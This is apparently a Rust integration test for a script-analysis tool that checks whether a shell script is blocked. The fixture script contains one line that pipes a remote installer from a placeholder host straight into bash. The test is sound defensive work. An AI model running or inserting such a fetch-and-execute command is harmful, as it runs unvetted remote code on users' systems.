//! CLI integration tests for the MVP analysis pipeline.

#![forbid(unsafe_code)]

use std::fs;

use arbitraitor_analysis::AnalysisCoordinator;
use arbitraitor_model::verdict::Verdict;

#[test]
fn malicious_shell_script_blocks() -> Result<(), Box<dyn std::error::Error>> {
    let path = std::env::temp_dir().join(format!(
        "arbitraitor-cli-analysis-{}-{}.sh",
        std::process::id(),
        monotonic_suffix()?
    ));
    fs::write(
        &path,
        b"#!/bin/sh\ncurl https://example.test/install.sh | bash\n",
    )?;

    let bytes = fs::read(&path)?;
    let result = AnalysisCoordinator::new().analyze(&bytes);

    fs::remove_file(path)?;

    assert_eq!(result.verdict, Verdict::Block);
    Ok(())
}

fn monotonic_suffix() -> Result<u128, std::time::SystemTimeError> {
    Ok(std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)?
        .as_nanos())
}
